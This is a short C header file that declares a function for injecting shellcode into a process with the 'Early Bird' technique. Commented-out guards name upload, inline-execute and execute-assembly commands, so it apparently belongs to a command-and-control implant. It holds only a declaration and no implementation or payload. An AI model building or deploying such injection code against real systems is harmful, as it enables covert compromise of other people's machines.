#pragma once
#ifndef INJECT_H
#define INJECT_H


// #ifdef defined(INCLUDE_CMD_UPLOAD) || defined(INCLUDE_CMD_INLINE_EXECUTE) || defined(INCLUDE_CMD_EXECUTE_ASSEMBLY)

#include <windows.h>
#include "Parser.h"
#include "Config.h"

BOOL InjectProcessViaEarlyBird(_In_ PBYTE buf, _In_ SIZE_T szShellcodeLen, _Out_ PCHAR* outData);

// #endif // defined(INCLUDE_CMD_UPLOAD) || defined(INCLUDE_CMD_INLINE_EXECUTE) || defined(INCLUDE_CMD_EXECUTE_ASSEMBLY)

#endif  //INJECT_H